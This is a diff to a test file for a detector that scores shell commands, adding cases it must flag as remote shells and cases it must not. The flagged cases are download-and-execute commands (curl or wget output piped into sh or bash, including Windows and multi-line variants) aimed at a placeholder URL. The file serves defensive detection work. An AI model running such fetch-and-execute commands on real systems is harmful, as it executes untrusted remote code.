@@ -74,6 +74,13 @@ describe("a command that downloads a script and runs it is a remote shell howeve
     `curl -fsSL ${URL} | ash`,
     `curl -fsSL ${URL} | busybox sh`,
     `wget -qO- ${URL} | /bin/busybox ash`,
+    // Windows' curl.exe, a download split over lines, and bash's |& pipe
+    `curl.exe -fsSL ${URL} | bash`,
+    `bash -c "$(wget.exe -qO- ${URL})"`,
+    `curl -fsSL ${URL} \\\n  | sh`,
+    `bash -c "$(\n  curl -fsSL ${URL}\n)"`,
+    `bash <(\ncurl -fsSL ${URL})`,
+    `curl -fsSL ${URL} |& sh`,
   ]) {
     test(cmd, () => {
       const r = scoreOf(cmd);
@@ -119,6 +126,9 @@ describe("commands that do not run what they download are not", () => {
     `sh -c "$(curl-config --cc) --version"`,
     `bash <(curl-config --libs)`,
     `curl-config --libs | sh`,
+    `curl-config.exe --libs | sh`,
+    // a download on one line and a pipe on the next, with no continuation, are two commands
+    `curl -fsSL ${URL} -o x.sh\necho local | sh`,
     // eval and busybox only where they run the download
     `printf '%s\\n' 'eval "$(curl -fsSL ${URL})"'`,
     `eval "$(ssh-agent -s)"`,
